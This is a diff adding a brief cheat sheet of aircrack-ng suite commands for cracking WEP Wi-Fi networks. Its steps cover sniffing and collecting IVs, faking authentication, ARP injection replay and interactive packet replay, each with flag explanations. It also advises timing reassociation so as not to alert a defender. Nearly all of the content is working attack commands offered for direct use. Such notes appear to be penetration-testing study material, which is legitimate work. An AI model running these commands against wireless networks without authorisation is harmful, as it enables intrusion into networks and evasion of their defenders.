@@ -1,0 +1,26 @@
+##SNIFFING and COLLECTING IVs
+	-airodump-ng --bssid <MAC> -c 6 -w wep_out wlan0mon
+	-airodump-ng --bssid MAC -c 6 -w wep_out --ivs --manufacturer --uptime --showack wlan0mon
+
+
+##FAKING AUTHENTICATION
+>-1 == faking authentication
+>0 == reassociation timing in seconds. 0 might alert defender, so set it to 30 or higher
+	-aireplay-ng -1 0 -a <AP_MAC> -h <CLIENT_MAC> -e <essid> wlan0mon
+	
+##GENERATE TRAFFIC appearing to come from trusted MAC and routing it to the target wireless AP
+>ARP injection/replay attack
+	-aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> wlan0mon
+
+
+##GENERATE ADDITIONAL PACKETS while ARP INJECTION Continues
+#interactive packet replay attack
+>-2 == interactive replay attack
+>-p 0841 == sets Frame Control Field of packet to maek it appear as if it is being sent from a wireless client
+>-c == sets destination. FF sends packet to all hosts on the network.
+>-b == MAC of BSSID
+>-h == MAC of packets being transmitted that should match the testers MAC address
+	-aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <AP_MAC> -h <CLIENT_MAC> wlan0mon
+
+
+
